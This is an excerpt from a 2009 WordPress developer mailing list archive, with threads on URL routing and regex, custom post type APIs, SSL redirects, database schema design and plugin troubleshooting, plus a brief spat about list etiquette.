It is my understanding that all timestamps are stored in UTC, and then  
displayed via the offset set in the Admin. If you're using PHP 5.x  
you'll get a much more accurate choice of timezones, which should also  
handle automatic DST issues. On PHP4 its still all kinds of awful  
(i.e. you have to manually change the offset to make the time accurate).


- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From jwriteclub at gmail.com  Thu Dec  3 22:49:41 2009
From: jwriteclub at gmail.com (Christopher O'Connell)
Date: Thu, 3 Dec 2009 15:49:41 -0700
Subject: [wp-hackers] The problem with WP_Rewrite <<< RE: Options for
	Controller - Views
In-Reply-To: <161617690912031339o2ad5c25enfb96728401c0e62b@mail.gmail.com>
References: <4B0C80C1.5070502@santosj.name>
	<161617690911281113q2e5f0460m12364d97e8a1cbfa@mail.gmail.com> 
	<37AD065D-6910-4110-A9DA-21B63ED65CCA@newclarity.net>
	<161617690912030804k11df1471h18f98d298b5a8e7@mail.gmail.com> 
	<566F50E8-9066-4A0B-B486-2BC2574CA946@newclarity.net>
	<161617690912030901h7ca37287t6a46c11f135388f4@mail.gmail.com> 
	<A5DC889F-117C-483F-91E8-840B0B98E165@newclarity.net>
	<161617690912030943r270d5237xb35de5f73fcde502@mail.gmail.com> 
	<81d01c0912031118v3fca59eeh27447870f8de8bab@mail.gmail.com> 
	<161617690912031339o2ad5c25enfb96728401c0e62b@mail.gmail.com>
Message-ID: <81d01c0912031449i2e0b863bm724cef23b1ed0e1a@mail.gmail.com>

>
>
> Let me rephrase that: SQL is designed to be used by *business people*.
> Not programmers.
>

And the goal clearly failed. Unless your "Business People" are much better
trained (and by that I mean terrified of you) than mine, they won't touch it
with a 10 foot pole.

>
> The only real reason we abstract it out is because we have only a
> small subset of SQL queries that are needed for the application at
> hand.
>

EXACTLY: Just like we have a small set of RegEx that we normally use. When
things get really complicated I can write my own RegEx, just as I write my
own SQL when things get really complicated now.


>
> You're looking at this from the point of view of "redirecting a URL to
> a template". But I'm looking at this from the point of view of what
> you *actually* want to do, which is to parse the URL and then
> determine and load the right template. These are actually equivalent,
> but for some reason, you are not seeing that fact.
>
>
If all that anyone ever wanted to do was to load a predefined theme file for
some URL, than your scheme is somewhat cumbersome but works. The general
case, however, is to have a particular URL stub (say /products, as it's
being used in discussion) cause a function to run that does some magic and
then loads a specific template file. The simplest case of this is when you
want to load the template file without sending it any particular arguments.
My case is not super specific, it's actually quite general, it's a common
use case, and the fact that I need to muck around in terms of rewriting the
already parsed arguments to change to a custom post type is ludicrous.


> Let's say I wrote you a new function, called redirect_URL_to_template.
> It'd work like this:
> redirect_URL_to_template('products');
>

Well of course it's silly, you don't build an API to the dumbest common
denominator, you build it to a reasonable general case. The problem with the
current version is that what you've just proposed is just about the
*only*case where the current version makes sense.

Or, I could teach you "this is how the system works, it's pretty
> simple but you do have to think a small amount, however it's powerful
> enough to let you make any arbitrary URL do any damn thing you like,
> whether it be routing to views, or calling functions, or even
> downloading the complete works of shakespeare.. You can do anything
> with it, and all you have to learn is this extremely tiny subset of
> regular expressions. And by extremely tiny, I only mean what these
> characters do: .*?+[]()$     Seriously, that's probably all you ever
> need.
>
> What makes more sense?
>

RegEx is not simple for people to learn. Unless and until one has a working
knowledge of regular languages, regular expressions are a black art. Can
people get some simple examples working? Maybe, but more complex (but still
common) routeings require a complex understanding of both regular languages
and the parsing engine itself (e.g. how "greedy" is it).

It makes more sense to allow people to say /products/{category}/{product} =>
display_product, where function
display_product($cat="shoes",$product="loafers"). Could it be wired up in
RegEx? Sure, but it's not simple.


>
> > P.P.S. This reminds me of the discussions on some of the linux boards
> about
> > how "including a graphical package manager is totally unneccessary,
> because
> > there's a command line one".
>
> Funnily enough, on my Fedora install, I'm always popping up a command
> line to run yum, because PackageKit sucks and is hard to use.
>

Umm, pretty much proves my point. I too use yum all the time, because I'm a
super nerdy linux beard. But for mere mortals the GUI is the way to go!

~ Christopher

From mikeschinkel at newclarity.net  Thu Dec  3 22:50:22 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 3 Dec 2009 17:50:22 -0500
Subject: [wp-hackers] STFU kthxbai
In-Reply-To: <03005BB1-DE0E-4ACE-8914-5B3708370063@anthony.geek.nz>
References: <03005BB1-DE0E-4ACE-8914-5B3708370063@anthony.geek.nz>
Message-ID: <F63D6104-8C32-4FD6-9C85-40E61B474EEC@newclarity.net>

Anthony,

I apologize for my part in this.  I will try my best not to do it again.

-Mike

On Dec 3, 2009, at 5:37 PM, Anthony Cole wrote:

> I know it's kind of obvious, but, well, I can't take this anymore.
> 
> I can't read anything on this list, and I know I speak for alot of people when I say this. 
> 
> Do you guys know when to shut up? Seriousy. I've been on this list for about two days after a little hiatus. I'm not really well known, but one thing I do know is that I'm human - just like everyone here - and for my sanity and others - I'm asking for just a little bit of peace and quiet. 
> 
> I've seen people ask questions and get flooded out by people acting like five year olds. I know people who've left this list because of it. I remember how this list was a few years ago, and although it's always been a little bit controversial, can we stop acting like we're all still in primary school?
> 
> It's obvious who's causing the problems. 
> 
> And thats my two cents....
> 
> *runs from the vultures*
> 
> -ac
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From wp-hackers at striderweb.com  Thu Dec  3 22:52:56 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Thu, 3 Dec 2009 16:52:56 -0600
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <FADAE09C-2A24-4EF7-B35E-3666BF130144@xentek.net>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
	<A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
	<FADAE09C-2A24-4EF7-B35E-3666BF130144@xentek.net>
Message-ID: <C861EFC8-5670-4191-80E6-B7473ADF5FC3@striderweb.com>


On Dec 3, 2009, at 4:43 PM, Eric Marden wrote:

> On Dec 3, 2009, at 1:41 PM, Stephen Rider wrote:
> 
>> I think a cart/horse inversion is happening here, but something to keep in mind for *after* the full Post Type API is in place.
> 
> What do you mean by the full post API? What can't you do with wp_insert_post, wp_update_post, wp_delete_post, get_post, get_posts, add_post_meta, update_post_meta, delete_post_meta, and friends?

Creating a core create_edit_page() function of some sort.  Quoting myself:

"I need an edit page for Post Type X.  It needs (for example) the Main Text Box, Tags, and Excerpt.  Bang!  Done."

Set it up so that plugins can readily use this with custom post types, but also the standard Edit Post/Page pages should run off the same code.  (Keeps things consistent and consolidated.)

...plus whatever else people suggest that seems like a solid enough concept.

Stephen


-- 
Stephen Rider
http://striderweb.com/


From wp at xentek.net  Thu Dec  3 22:54:22 2009
From: wp at xentek.net (Eric Marden)
Date: Thu, 3 Dec 2009 17:54:22 -0500
Subject: [wp-hackers] What is the best method to check a theme's
	dependencies on plugins?
In-Reply-To: <4B0FDADE.2000507@gmail.com>
References: <4B0FDADE.2000507@gmail.com>
Message-ID: <3C84B912-F37E-410B-9BAD-BC32C3B20F30@xentek.net>

> I'm working on a theme which is going to be used in conjunction with a
> lot of plugins. So naturally I want to make sure these plugins are all
> active and ready for my theme to use, but I'm not sure about the best
> way to approach this.

Your best bet is to have the theme gracefully degrade if the plugins  
aren't available. Using function_exists around functionality that  
depends on a plugin. You could have a custom options screen in the  
admin with a checklist for each plugin, helping users set up the theme  
properly and maybe even use a sticky notice (like akismet does) to  
drive users there after theme activation.


- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From mccormicky at gmail.com  Thu Dec  3 22:55:04 2009
From: mccormicky at gmail.com (mccormicky)
Date: Thu, 3 Dec 2009 17:55:04 -0500
Subject: [wp-hackers] From SSL to non-SSL
Message-ID: <d7153760912031455j2f2bb8a9qbcad46c984470606@mail.gmail.com>

I have this issue going on with one site I'll call case study 2  which needs
one page secured.

The page gets secured  but if anyone clicks a navigation tab/link the site
remains in the secure state, all urls remain https.

I installed https for wordpress (plugin) on another website which I will
call case study 1 and secured one page.

On case study 1 if a navigation tab/link the site redirects out of https and
all urls revert back to http. This is the ideal.

Case study 1 and case study 2 both use the https for wordpress plugin. And
both have  privately signed SSL certificates for their domains.

One difference between the 2 sites is one uses godaddy (case study 1) the
other uses hostcentric.

Any ideas why the results are better for case study 1?

From wp at xentek.net  Thu Dec  3 22:56:01 2009
From: wp at xentek.net (Eric Marden)
Date: Thu, 3 Dec 2009 17:56:01 -0500
Subject: [wp-hackers] Putting post into /blog/
In-Reply-To: <79D6517B-A627-4EF6-A4D8-8C39F6DE6803@ftwr.co.uk>
References: <1C3F993B-12FC-4E1E-8373-EBCF534C509A@newclarity.net>
	<79D6517B-A627-4EF6-A4D8-8C39F6DE6803@ftwr.co.uk>
Message-ID: <6A35E6CE-2A8E-4E56-BFCC-6DB6D5523BBC@xentek.net>

On Nov 28, 2009, at 12:26 PM, Peter Westwood wrote:

> You can share the user tables between the two

I blogged about this bit, which might helpful: http://xentek.net/articles/528/implementing-the-wordpress-shared-users-table-trick/

- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From wp-hackers at striderweb.com  Thu Dec  3 22:58:32 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Thu, 3 Dec 2009 16:58:32 -0600
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <71ddd7490912031259p703dd9e6he8947c9c4bd78455@mail.gmail.com>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
	<A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
	<71ddd7490912031259p703dd9e6he8947c9c4bd78455@mail.gmail.com>
Message-ID: <34B5196F-4A67-4597-95D1-6CEB4DB89A3C@striderweb.com>

On Dec 3, 2009, at 2:59 PM, Doug Stewart wrote:

> My one HUGE request:
> 
> * Hierarchies for custom post types/taxonomies. (Slap me if I'm mixing
> my metaphors and have the notion of custom post types all
> whopperjawed...)

Admittedly this goes far beyond what I had in mind, as I was talking about an API frontend for plugin authors to use the existing (as of 2.9) custom post type functionality.

Hierarchies is getting into a significant restructuring of Post Types, and is a bit more ambitious of a leap than I would want to try in one go.

You're aiming for a full-out Drupal-style "node" tree, which complicates everything immensely.

Stephen

-- 
Stephen Rider
http://striderweb.com/


From wp-hackers at striderweb.com  Thu Dec  3 23:08:23 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Thu, 3 Dec 2009 17:08:23 -0600
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <C861EFC8-5670-4191-80E6-B7473ADF5FC3@striderweb.com>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
	<A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
	<FADAE09C-2A24-4EF7-B35E-3666BF130144@xentek.net>
	<C861EFC8-5670-4191-80E6-B7473ADF5FC3@striderweb.com>
Message-ID: <79A04F64-1A67-496A-AC7C-1A68A98B3315@striderweb.com>


On Dec 3, 2009, at 4:52 PM, Stephen Rider wrote:

> On Dec 3, 2009, at 4:43 PM, Eric Marden wrote:
> 
>> What do you mean by the full post API? What can't you do with wp_insert_post, wp_update_post, wp_delete_post, get_post, get_posts, add_post_meta, update_post_meta, delete_post_meta, and friends?
> 
> Creating a core create_edit_page() function of some sort.  Quoting myself:
> 
> "I need an edit page for Post Type X.  It needs (for example) the Main Text Box, Tags, and Excerpt.  Bang!  Done."
> On Dec 3, 2009, at 1:41 PM, Stephen Rider wrote:

in separate email:
>> What we need are more functions like the_editor() that make adding different parts of the screen(s) to the page, without copying a lot of markup.

Eric -- this suggests a good approach.  Instead of one mega-"add edit page" function, perhaps simply make it so every stock edit page element has a small function that creates it.  Thus the code that creates the standard Edit Post page might simply look like:

create_editor();
create_excerpt_box();
create_custom_field_box();
create_pingbacks_box();
...etc.

or maybe better:

editor_element('editor');
editor_element('excerpt');
editor_element('custom_fields');
editor_element('pingbacks');

Question for those more familiar:  What functions of this type already exist?  I don't mean the generic add_meta(), I mean dedicated functions for editor elements....

Stephen



-- 
Stephen Rider
http://striderweb.com/


From wp at xentek.net  Thu Dec  3 23:09:57 2009
From: wp at xentek.net (Eric Marden)
Date: Thu, 3 Dec 2009 18:09:57 -0500
Subject: [wp-hackers] Hook into load-styles.php / load-scripts.php
	"queue"?
In-Reply-To: <4B15632E.2070002@wpseek.com>
References: <4B15632E.2070002@wpseek.com>
Message-ID: <374CF982-66CC-4594-908F-064DE25F8ABD@xentek.net>


On Dec 1, 2009, at 1:40 PM, Oliver Schl?be wrote:
> I was just curious. Is it possible to hook into load-styles.php /  
> load-scripts.php to load a custom CSS/JS file the same way WP loads  
> the files in wp-admin? Would be nice to get your own plugin  
> javascript files loaded minified/merged in load-scripts.php.


I think they want to bring this functionality out to the front-end,  
but are getting working 100% in the admin first. This plugin may be  
useful in the mean time: http://wordpress.org/extend/plugins/w3-total-cache/


- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From wp at xentek.net  Thu Dec  3 23:22:12 2009
From: wp at xentek.net (Eric Marden)
Date: Thu, 3 Dec 2009 18:22:12 -0500
Subject: [wp-hackers] Hosting Profiles (WAS: Tips for moving a Wordpress
	install)
In-Reply-To: <a21f8bf00912011351t2a18898w3b61245c99a28f6f@mail.gmail.com>
References: <d14758810912011220u6d17bb68p4c7fb226125bd89d@mail.gmail.com>
	<161617690912011323i554a1c9cncef83ff20f31fa59@mail.gmail.com>
	<E5CE7854-6B8F-417C-B2A7-C2B6C4974739@newclarity.net>
	<a21f8bf00912011351t2a18898w3b61245c99a28f6f@mail.gmail.com>
Message-ID: <95A8CEE9-E084-4502-8585-83AEFD022FBD@xentek.net>

On Dec 1, 2009, at 4:51 PM, Steve Taylor wrote:

>  I'm dealing with more WP clients where a dev > staging >
> production set up is mandatory

I need to blog about this, but I've got a rather elegant solution  
using apache_getenv, a switch statement, and the stuff you can do with  
wp-config.php in terms of URLs: http://codex.wordpress.org/Editing_wp-config.php

We use it to manage not only multi-environment dev workflows, but each  
member of the team manages their own local installs too. Still need to  
manage data syncing, like for content/configuration, but that can be  
done by treating one of the DBs as the 'source of truth' that all  
other sync from.


- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From wp at xentek.net  Thu Dec  3 23:24:17 2009
From: wp at xentek.net (Eric Marden)
Date: Thu, 3 Dec 2009 18:24:17 -0500
Subject: [wp-hackers] Blog containing 5,00,000 posts. Slow Admin panel
In-Reply-To: <3ee7077c0912022001r23d9cadbuefc503904ab3c880@mail.gmail.com>
References: <mailman.9.1259755202.30226.wp-hackers@lists.automattic.com>
	<op.u4bf53c51214gw@akshay-pc>
	<3ee7077c0912022001r23d9cadbuefc503904ab3c880@mail.gmail.com>
Message-ID: <C33E666A-F2CB-4A15-840C-39D38B0488D9@xentek.net>

On Dec 2, 2009, at 11:01 PM, Casey Bisson wrote:

> So, what are you doing with 5,000,000 or 500,000 posts?

Blogging your ass off.

- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From gurdiga at gmail.com  Fri Dec  4 01:44:21 2009
From: gurdiga at gmail.com (Vlad GURDIGA)
Date: Fri, 4 Dec 2009 03:44:21 +0200
Subject: [wp-hackers] WorPress dies silently without MySQL PHP extention
Message-ID: <da7069940912031744w6c75f963lfdc5bbc667b96124@mail.gmail.com>

Hello!

When there is no MySQL PHP extension installed, for example when you
have WordPress working on an SQLite DB instead of MySQL, wpdb
constructor dies silently trying to

$this->dbh = @mysql_connect($dbhost, $dbuser, $dbpassword, true);

Is that OK?

From johnbillion+wp at gmail.com  Fri Dec  4 02:53:32 2009
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Fri, 4 Dec 2009 02:53:32 +0000
Subject: [wp-hackers] Keeping track of comment responses
In-Reply-To: <05F481B8-2A01-46EE-8B46-1B358EADF3F5@g8o.net>
References: <05F481B8-2A01-46EE-8B46-1B358EADF3F5@g8o.net>
Message-ID: <1fa535a70912031853v31290edar37d697fee027220d@mail.gmail.com>

On 03/12/2009, [ ravi ] <ravi-lists at g8o.net> wrote:
>
>  Hello all,
>
>  I need your advice before I run off trying to implement something.
>
>  My problem: how do I keep track of which comments I have responded to and
> which ones are awaiting a response?

This sounds like a prime opportunity for a new plugin. Something that
lists all comments that have no replies, so you can quickly look
through them and adds replies if necessary, and possibly an "ignore"
button for comments you've no intention of replying to.

From ghodmode at ghodmode.com  Fri Dec  4 04:27:21 2009
From: ghodmode at ghodmode.com (Ghodmode)
Date: Fri, 04 Dec 2009 17:27:21 +1300
Subject: [wp-hackers] STFU kthxbai
In-Reply-To: <03005BB1-DE0E-4ACE-8914-5B3708370063@anthony.geek.nz>
References: <03005BB1-DE0E-4ACE-8914-5B3708370063@anthony.geek.nz>
Message-ID: <1259900841.32707.9.camel@home>

I don't know the context of your message, but I find it very easy to
ignore email threads that I'm not interested in.

You may speak for a lot of people, but you don't speak for me.

If you feel so strongly against someone's comments that you want to tell
them to Shut The Fuck Up, you can do it off-list.

In case you haven't guessed it, I don't consider acronyms more polite
than their meanings.

-- 
Ghodmode
http://www.ghodmode.com

On Fri, 2009-12-04 at 11:37 +1300, Anthony Cole wrote:
> I know it's kind of obvious, but, well, I can't take this anymore.
> 
> I can't read anything on this list, and I know I speak for alot of people when I say this. 
> 
> Do you guys know when to shut up? Seriousy. I've been on this list for about two days after a little hiatus. I'm not really well known, but one thing I do know is that I'm human - just like everyone here - and for my sanity and others - I'm asking for just a little bit of peace and quiet. 
> 
> I've seen people ask questions and get flooded out by people acting like five year olds. I know people who've left this list because of it. I remember how this list was a few years ago, and although it's always been a little bit controversial, can we stop acting like we're all still in primary school?
> 
> It's obvious who's causing the problems. 
> 
> And thats my two cents....
> 
> *runs from the vultures*
> 
> -ac
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers



From ghodmode at ghodmode.com  Fri Dec  4 04:31:54 2009
From: ghodmode at ghodmode.com (Ghodmode)
Date: Fri, 04 Dec 2009 17:31:54 +1300
Subject: [wp-hackers] Blog containing 5,00,000 posts. Slow Admin panel
In-Reply-To: <3ee7077c0912022001r23d9cadbuefc503904ab3c880@mail.gmail.com>
References: <mailman.9.1259755202.30226.wp-hackers@lists.automattic.com>
	<op.u4bf53c51214gw@akshay-pc>
	<3ee7077c0912022001r23d9cadbuefc503904ab3c880@mail.gmail.com>
Message-ID: <1259901114.32707.11.camel@home>

> So, what are you doing with 5,000,000 or 500,000 posts?

Either way, that's impressive.

Post a link to your blog Akshay.  I wanna read :)


From scribu at gmail.com  Fri Dec  4 11:20:20 2009
From: scribu at gmail.com (scribu)
Date: Fri, 4 Dec 2009 13:20:20 +0200
Subject: [wp-hackers] Database structure Wordpress
In-Reply-To: <2337E749-27DE-448F-B7A4-EB48CDD60FC9@newclarity.net>
References: <C98C6445-D7ED-44CE-AA53-EB3FAFD0022B@gmail.com>
	<161617690912030712v5edc0858uc8b6d9bfaef26260@mail.gmail.com>
	<+iaFqNBwMBGLFwzA@dsl-217-155-35-239.zen.co.uk>
	<2337E749-27DE-448F-B7A4-EB48CDD60FC9@newclarity.net>
Message-ID: <349fe48b0912040320m6be815c1h1676eaca42de3a39@mail.gmail.com>

On Thu, Dec 3, 2009 at 9:53 PM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:

> To use an example more concrete for WordPress, let's say you have two
> custom post types, "Products" and "Companies."  You could end up with three
> tables to manage this with one-to-one relationships between posts and
> products and between posts and companies:
>
> wp_posts
> wp_custom_products
> wp_custom_companies
>
> To see this structure in action look at Drupal's CCK module or the PODs
> plugin for WordPress.  And it is relationally correct.
>
> But again, this should probably be an option to the current metadata table
> approach for only if and when it is needed.
>

Given the principle that WP schema only contains tables that are actually
used by Core, it's pretty clear that this is plugin territory.

There aren't enough different columns between post, page & attachment to
warrant this approach.

Plus, the meta tables offer a lot more flexibility.

Also, there's nothing preventing you from building a custom table with
certain columns that you need to do complex queries with.


-- 
http://scribu.net

From scribu at gmail.com  Fri Dec  4 11:21:39 2009
From: scribu at gmail.com (scribu)
Date: Fri, 4 Dec 2009 13:21:39 +0200
Subject: [wp-hackers] Blog containing 5,00,000 posts. Slow Admin panel
In-Reply-To: <1259901114.32707.11.camel@home>
References: <mailman.9.1259755202.30226.wp-hackers@lists.automattic.com>
	<op.u4bf53c51214gw@akshay-pc>
	<3ee7077c0912022001r23d9cadbuefc503904ab3c880@mail.gmail.com>
	<1259901114.32707.11.camel@home>
Message-ID: <349fe48b0912040321x16441383l8043111983346d58@mail.gmail.com>

I think your best bet would be to use something like the HyperDB class.


-- 
http://scribu.net

From scribu at gmail.com  Fri Dec  4 11:25:51 2009
From: scribu at gmail.com (scribu)
Date: Fri, 4 Dec 2009 13:25:51 +0200
Subject: [wp-hackers] WorPress dies silently without MySQL PHP extention
In-Reply-To: <da7069940912031744w6c75f963lfdc5bbc667b96124@mail.gmail.com>
References: <da7069940912031744w6c75f963lfdc5bbc667b96124@mail.gmail.com>
Message-ID: <349fe48b0912040325q7135826ew611206bdfac315e6@mail.gmail.com>

No, it's not ok. Should probably remove the @ before the function.

I thought you got a "Can't connect to the database" warning page when that
happens.

Btw, WordPress doesn't guarantee compatibility with any DB other than MySQL.


On Fri, Dec 4, 2009 at 3:44 AM, Vlad GURDIGA <gurdiga at gmail.com> wrote:

> Hello!
>
> When there is no MySQL PHP extension installed, for example when you
> have WordPress working on an SQLite DB instead of MySQL, wpdb
> constructor dies silently trying to
>
> $this->dbh = @mysql_connect($dbhost, $dbuser, $dbpassword, true);
>
> Is that OK?
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://scribu.net

From scribu at gmail.com  Fri Dec  4 11:31:36 2009
From: scribu at gmail.com (scribu)
Date: Fri, 4 Dec 2009 13:31:36 +0200
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <79A04F64-1A67-496A-AC7C-1A68A98B3315@striderweb.com>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
	<A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
	<FADAE09C-2A24-4EF7-B35E-3666BF130144@xentek.net>
	<C861EFC8-5670-4191-80E6-B7473ADF5FC3@striderweb.com>
	<79A04F64-1A67-496A-AC7C-1A68A98B3315@striderweb.com>
Message-ID: <349fe48b0912040331i59061583m5b715c2479dcd27@mail.gmail.com>

On Fri, Dec 4, 2009 at 1:08 AM, Stephen Rider <wp-hackers at striderweb.com>wrote:

> editor_element('editor');
> editor_element('excerpt');
> editor_element('custom_fields');
> editor_element('pingbacks');
>
> Question for those more familiar:  What functions of this type already
> exist?  I don't mean the generic add_meta(), I mean dedicated functions for
> editor elements....
>

People seem to be unaware of the existance of add_meta_box() and
remove_meta_box().

I use them all the time to create Dashboard like plugin settings pages.


-- 
http://scribu.net

From ozh at planetozh.com  Fri Dec  4 11:43:04 2009
From: ozh at planetozh.com (Ozh)
Date: Fri, 4 Dec 2009 12:43:04 +0100
Subject: [wp-hackers] WorPress dies silently without MySQL PHP extention
In-Reply-To: <349fe48b0912040325q7135826ew611206bdfac315e6@mail.gmail.com>
References: <da7069940912031744w6c75f963lfdc5bbc667b96124@mail.gmail.com>
	<349fe48b0912040325q7135826ew611206bdfac315e6@mail.gmail.com>
Message-ID: <ae81acd10912040343m5e362acdt29f69f84507210cf@mail.gmail.com>

My guess is that it *is* OK, to prevent an ugly notice and just
display the pretty, maybe custom, error message using wp_die()
instead.

On Fri, Dec 4, 2009 at 12:25 PM, scribu <scribu at gmail.com> wrote:
> No, it's not ok. Should probably remove the @ before the function.
>
> I thought you got a "Can't connect to the database" warning page when that
> happens.
>
> Btw, WordPress doesn't guarantee compatibility with any DB other than MySQL.
>
>
> On Fri, Dec 4, 2009 at 3:44 AM, Vlad GURDIGA <gurdiga at gmail.com> wrote:
>
>> Hello!
>>
>> When there is no MySQL PHP extension installed, for example when you
>> have WordPress working on an SQLite DB instead of MySQL, wpdb
>> constructor dies silently trying to
>>
>> $this->dbh = @mysql_connect($dbhost, $dbuser, $dbpassword, true);
>>
>> Is that OK?
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>
> --
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://planetOzh.com ~ Blog and WordPress Stuff
http://FrenchFragFactory.net ~ Daily Quake News

From jeffc at wptavern.com  Fri Dec  4 12:54:39 2009
From: jeffc at wptavern.com (Jeff Chandler)
Date: Fri, 04 Dec 2009 07:54:39 -0500
Subject: [wp-hackers] Keeping track of comment responses
Message-ID: <4B19068F.5000806@wptavern.com>

I would take a look at the WP Comment Remix plugin which has a feature 
in it that tells you how many comments you have with 0 replies. This 
plugin is not maintained anymore but the code within it for that 
specific function might give you a head start.

http://wordpress.org/extend/plugins/wp-comment-remix/

From mikeschinkel at newclarity.net  Fri Dec  4 13:05:03 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 4 Dec 2009 08:05:03 -0500
Subject: [wp-hackers] Database structure Wordpress
In-Reply-To: <349fe48b0912040320m6be815c1h1676eaca42de3a39@mail.gmail.com>
References: <C98C6445-D7ED-44CE-AA53-EB3FAFD0022B@gmail.com>
	<161617690912030712v5edc0858uc8b6d9bfaef26260@mail.gmail.com>
	<+iaFqNBwMBGLFwzA@dsl-217-155-35-239.zen.co.uk>
	<2337E749-27DE-448F-B7A4-EB48CDD60FC9@newclarity.net>
	<349fe48b0912040320m6be815c1h1676eaca42de3a39@mail.gmail.com>
Message-ID: <6EFEB160-E6A4-4A11-AABA-F654143D3A76@newclarity.net>

On Dec 4, 2009, at 6:20 AM, scribu wrote:
> On Thu, Dec 3, 2009 at 9:53 PM, Mike Schinkel
> <mikeschinkel at newclarity.net>wrote:
> 
>> To use an example more concrete for WordPress, let's say you have two
>> custom post types, "Products" and "Companies."  You could end up with three
>> tables to manage this with one-to-one relationships between posts and
>> products and between posts and companies:
>> 
>> wp_posts
>> wp_custom_products
>> wp_custom_companies
>> 
>> To see this structure in action look at Drupal's CCK module or the PODs
>> plugin for WordPress.  And it is relationally correct.
>> 
>> But again, this should probably be an option to the current metadata table
>> approach for only if and when it is needed.
>> 
> 
> Given the principle that WP schema only contains tables that are actually
> used by Core, it's pretty clear that this is plugin territory.
> 
> There aren't enough different columns between post, page & attachment to
> warrant this approach.
> 
> Plus, the meta tables offer a lot more flexibility.
> 
> Also, there's nothing preventing you from building a custom table with
> certain columns that you need to do complex queries with.

FWIW I made some comments on the database thread yesterday that explained pros and cons of the above approach vs. the metadata approach. For complex relationships the above beats out metadata structures hands down but I lamented that we'd probably never see it in WordPress core because of the WordPress team's bias.  I wrote the above as if a continuation of that prior thread.

-Mike

From me at anthony.geek.nz  Fri Dec  4 13:06:01 2009
From: me at anthony.geek.nz (Anthony Cole)
Date: Sat, 5 Dec 2009 02:06:01 +1300
Subject: [wp-hackers] get_objects_in_term
Message-ID: <C8A7F918-1662-4614-AA3C-44D72003CFD0@anthony.geek.nz>

Hey All,

I've been troubleshooting this all night and I still can't figure it out. It seems so simple - but for some reason, get_objects_in_term is acting up and returning an empty array. 

I have the following markup - have had two people look over it and they said it looks fine. 

> $vars = array('location', 'pricing', 'rating');
> 							
> foreach($vars as $var) {
> 	if(empty($_GET[$var]) || $_GET[$var] == 'all')
> 		$taxonomies[] = 'bell_' . $var;
> 	else
> 		$terms[] = $_GET[$var];
> 	}
> 				
> 	$nums = array_map('intval', $terms);  // tried doing this outside the function as well as the id was a string
> 				
> 	$objects = get_objects_in_term( $nums, $taxonomies );
> 	
> 	$ids = implode(',', $objects);


I've var_dumped $nums and $taxonomies and they're coming out the other end fine. Doing the get_objects_in_term query manually works.

Any ideas?

-ac

From wp-hackers at striderweb.com  Fri Dec  4 13:42:23 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Fri, 4 Dec 2009 07:42:23 -0600
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <349fe48b0912040331i59061583m5b715c2479dcd27@mail.gmail.com>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
	<A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
	<FADAE09C-2A24-4EF7-B35E-3666BF130144@xentek.net>
	<C861EFC8-5670-4191-80E6-B7473ADF5FC3@striderweb.com>
	<79A04F64-1A67-496A-AC7C-1A68A98B3315@striderweb.com>
	<349fe48b0912040331i59061583m5b715c2479dcd27@mail.gmail.com>
Message-ID: <E26D31C2-4783-40DA-B6BF-86091EDB29B3@striderweb.com>


On Dec 4, 2009, at 5:31 AM, scribu wrote:

> On Fri, Dec 4, 2009 at 1:08 AM, Stephen Rider <wp-hackers at striderweb.com>wrote:
> 
>> editor_element('editor');
>> editor_element('excerpt');
>> editor_element('custom_fields');
>> editor_element('pingbacks');
>> 
>> Question for those more familiar:  What functions of this type already
>> exist?  I don't mean the generic add_meta(), I mean dedicated functions for
>> editor elements....
>> 
> 
> People seem to be unaware of the existance of add_meta_box() and
> remove_meta_box().
> 
> I use them all the time to create Dashboard like plugin settings pages.

